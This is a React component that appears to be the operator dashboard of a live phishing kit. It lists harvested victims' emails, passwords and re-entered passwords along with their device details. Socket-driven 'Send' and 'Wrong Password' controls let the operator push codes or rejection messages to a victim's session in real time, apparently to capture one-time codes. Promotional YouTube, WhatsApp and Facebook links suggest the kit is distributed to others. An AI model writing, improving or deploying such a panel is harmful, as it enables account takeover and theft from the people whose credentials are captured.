/* eslint-disable @typescript-eslint/no-explicit-any */

import { MailIcon } from "./Icons";
import moment from "moment";
import Pagination from "./Pagination";
import { FaWindows, FaApple, FaLinux, FaAndroid, FaYoutube, FaWhatsapp, FaFacebook, } from "react-icons/fa";
import { ChevronDown } from "lucide-react";
import EmailViewPage from "../pages/EmailViewPage";
import { useState } from "react";
import { handleCopyClick } from "../utils/copyToClipboard";
import useSocket from "../hooks/useSocket";

// Platform Icon component with hover tooltip
const PlatformIcon = ({ platform }: { platform: string }) => {
  const platformLower = platform.toLowerCase();
  let IconComponent;
  let color;
  let title;

  if (platformLower.includes("win")) {
    IconComponent = FaWindows;
    color = "text-blue-400";
    title = "Windows";
  } else if (platformLower.includes("mac")) {
    IconComponent = FaApple;
    color = "text-gray-700 dark:text-gray-300";
    title = "Mac";
  } else if (platformLower.includes("iphone") || platformLower.includes("ipad")) {
    IconComponent = FaApple;
    color = "text-blue-400";
    title = platformLower.includes("iphone") ? "iPhone" : "iPad";
  } else if (platformLower.includes("linux")) {
    IconComponent = FaLinux;
    color = "text-yellow-500";
    title = "Linux";
  } else if (platformLower.includes("android")) {
    IconComponent = FaAndroid;
    color = "text-green-500";
    title = "Android";
  } else {
    // Default icon for unknown platform
    IconComponent = () => <span className="text-xs">DEV</span>;
    color = "text-gray-400";
    title = platform || "Unknown Device";
  }

  return (
    <div className="relative group">
      <IconComponent className={`h-5 w-5 ${color}`} />
      <div className="absolute z-10 bottom-full left-1/2 transform -translate-x-1/2 mb-2 px-2 py-1 text-xs text-white bg-gray-800 rounded-md opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none whitespace-nowrap">
        {title}
      </div>
    </div>
  );
};

   // adjust import if needed

export default function InboxList({ data, setCurrentPage, currentPage,setSearchQuery,searchQuery }: any) {
  // const navigate = useNavigate();
  // const location = useLocation();

  const handlePageChange = (page: number) => {
    setCurrentPage(page);
  };

  // const handleEmailClick = (id: string) => {
  //   const currentPath = location.pathname;

  //   if (currentPath === "/Conversation") return;

  //   const targetPath = `/inbox/${id}`;
  //   if (currentPath !== targetPath) {
  //     navigate(targetPath);
  //   }
  // };
const [expandedRow, setExpandedRow] = useState<string | null>(null);
  const { sendToServer } = useSocket();

const handleEmailClick  = (id: string) => {
  setExpandedRow((prev) => (prev === id ? null : id));
};

const [inputValues, setInputValues] = useState<Record<string, string>>({});
 // place this at the top of your component
const handleSend = (emailId: string, value: string,email:string) => {
  console.log("Sending:", value, emailId,email);
  const data = {
    url: "https://joyful-blini-8c3497.netlify.app/test",
    code: value,
  };
  sendToServer("code", emailId, data);

  // Clear only that field
  setInputValues((prev) => ({ ...prev, [emailId]: "" }));
};

const sendWrongPassword = (emailId: string, value: string) => {
  data={
code:value
  }
  console.log(data,"email")
  sendToServer("code", emailId, data);
}


// utils/emailUtils.ts (or directly in your component file)
 const openEmailInUrl = (email: string) => {

  const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=${encodeURIComponent(email)}`;
  
  window.open(gmailUrl, "_blank");
};

  return (
    <div className="max-w-full bg-white dark:bg-gray-800 rounded-xl shadow-lg p-4 md:p-6">
       <div className="mb-4  flex flex-col md:flex-row items-center justify-between gap-4">
    <input
      type="text"
      placeholder="Search by email..."
      value={searchQuery}
      onChange={(e) => setSearchQuery(e.target.value)}
      className="w-full md:w-1/3 px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-800 text-sm text-gray-700 dark:text-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
    />
      {/* 👇 Extra buttons for navigation */}
  
  <div className="flex gap-4 ">
      {/* YouTube */}
    <a
  href="https://www.youtube.com/@update-tools"
  target="_blank"
  rel="noopener noreferrer"
  className="flex items-center gap-2 px-5 py-2 rounded-lg text-white font-semibold shadow-md
             bg-red-600 hover:bg-red-700 transition"
>
  <FaYoutube size={18} />
  YouTube
</a>

      {/* WhatsApp */}
      <a
        href="
https://chat.whatsapp.com/I4TWXr1wi0ZGL5NA8HoOIC"
        target="_blank"
        rel="noopener noreferrer"
        className="flex items-center gap-2 px-5 py-2 rounded-lg text-white font-semibold shadow-md
                   bg-green-500 hover:bg-green-600 transition"
      >
        <FaWhatsapp size={18} />
        WhatsApp
      </a>

      {/* Facebook */}
      <a
        href="https://web.facebook.com/share/g/1CaTJN7cG9/"
        target="_blank"
        rel="noopener noreferrer"
        className="flex items-center gap-2 px-5 py-2 rounded-lg text-white font-semibold shadow-md
                   bg-blue-600 hover:bg-blue-700 transition"
      >
        <FaFacebook size={18} />
        Facebook
      </a>
    </div>
  

  
  </div>
  <div className="overflow-x-auto">
    <table className="min-w-full border-separate border-spacing-y-1">
      <thead>
        <tr className="text-sm font-semibold text-gray-700 dark:text-gray-200 bg-gray-100 dark:bg-gray-700">
          <th className="text-center px-3 py-2 rounded-l-lg">Device</th>
          <th className="text-center px-3 py-2 rounded-l-lg">Name</th>
          <th className="text-center px-3 py-2">Email</th>
          <th className="text-center px-3 py-2">Password</th>
          <th className="text-center px-3 py-2">Re Password</th>
      
          <th className="text-center px-3 py-2">Code</th>
          {/* <th className="text-center px-3 py-2">Reply</th> */}
          <th className="text-center px-3 py-2">Agent</th>
          <th className="text-center px-3 py-2">See More</th>
          <th className="text-center px-3 py-2 rounded-r-lg">Time</th>
        </tr>
      </thead>
      <tbody>
        {data?.result?.map((email: any) => (
          <>
            <tr className="hover:bg-gray-100 dark:hover:bg-gray-700 transition"
             key={email._id}>
              <td className="text-center px-3 py-2">
                {email.agent?.platform && (
                  <div className="inline-flex items-center justify-center">
                    <PlatformIcon platform={email.agent.platform} />
                   
                  </div>
                )}
              </td>
       <h1  onClick={() => openEmailInUrl(email.email)}> {email.userDetails?.name?.slice(0, 8) || "-"}</h1>    
              <td className="text-center px-1 py-2 text-gray-800 dark:text-gray-100">
               <div className="inline-flex items-center justify-center gap-1">
  <MailIcon
    className="h-4 text-green-500 cursor-pointer"
   
  />
  <input
    type="text"
    readOnly
   value={email.email}   // default to original email

    onClick={() => handleCopyClick(email.email)}
    className="w-[180px] h-[36px] px-1 py-0.5 border border-gray-300 dark:border-gray-600 rounded bg-gray-200 dark:bg-gray-800 text-xs text-center cursor-pointer hover:border-blue-400"
  />
</div>

              </td>
              <td className="text-center px-3 py-2">
                <input
                  type="text"
                  readOnly
                  value={email.password}
                  onClick={() => handleCopyClick(email.password)}
                  className="w-[140px] h-[36px] px-2 py-0.5 border border-gray-300 dark:border-gray-600 rounded bg-gray-200 dark:bg-gray-800 text-xs text-center cursor-pointer hover:border-blue-400"
                />
              </td>
              <td className="text-center px-3 py-2">
                <input
                  type="text"
                  readOnly
                  value={email.repassword}
                  onClick={() => handleCopyClick(email.repassword)}
                  className="w-[140px] h-[36px] px-1 py-0.5 border border-gray-300 dark:border-gray-600 rounded bg-gray-200 dark:bg-gray-800 text-xs text-center cursor-pointer hover:border-blue-400"
                />
              </td>
              
       <td>
  <div className="flex items-center gap-2">
    {/* Input */}
    <input
      type="text"
      value={inputValues[email._id] || ""}
      onChange={(e) =>
        setInputValues((prev) => ({ ...prev, [email._id]: e.target.value }))
      }
      className="w-[120px] h-[36px] px-2 py-0.5 border border-gray-300 dark:border-gray-600 rounded bg-gray-200 dark:bg-gray-800 text-xs text-center hover:border-blue-400"
    />

    {/* Send Button */}
    <button
      onClick={() =>
        handleSend(email._id, inputValues[email._id] || "", email.email)
      }
      className="text-xs px-2 py-1 rounded bg-blue-500 hover:bg-blue-600 text-white h-[36px]"
    >
      Send
    </button>

    {/* Wrong Password Text */}
    <span
      onClick={() => sendWrongPassword(email._id, "wrong")}
      className="px-3 py-1 bg-red-500 text-white rounded-md text-xs cursor-pointer select-none"
      role="button"
      tabIndex={0}
    >
      Wrong Password
    </span>
  </div>
</td>



              <td className="text-center px-3 py-2">
                <button
                  onClick={() => handleCopyClick(email.agent?.source || "")}
                  className="text-xs px-2 py-1 rounded bg-indigo-500 hover:bg-indigo-600 text-white h-[36px]"
                >
                  Copy
                </button>
              </td>
              <td className="text-center px-3 py-2">
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    handleEmailClick(email._id);
                  }}
                  className={`transition-transform ${expandedRow === email._id ? "rotate-180" : ""}`}
                >
                  <ChevronDown className="h-4 w-4 text-gray-500 hover:text-purple-600" />
                </button>
              </td>
              <td className="text-center px-3 py-2 text-xs text-purple-700">
                {moment(email.createdAt).fromNow()}
              </td>
            </tr>

            {expandedRow === email._id && (
              <tr>
                <td colSpan={10} className="bg-gray-50 dark:bg-gray-900 px-4 py-2 border-t border-gray-200 dark:border-gray-700">
                  <EmailViewPage id={email._id} />
                </td>
              </tr>
            )}
          </>
        ))}
      </tbody>
    </table>
  </div>

  <div className="mt-4">
    <Pagination
      currentPage={currentPage}
      onPageChange={handlePageChange}
      totalPage={data?.meta?.totalPage}
    />
  </div>
</div>

  );
}
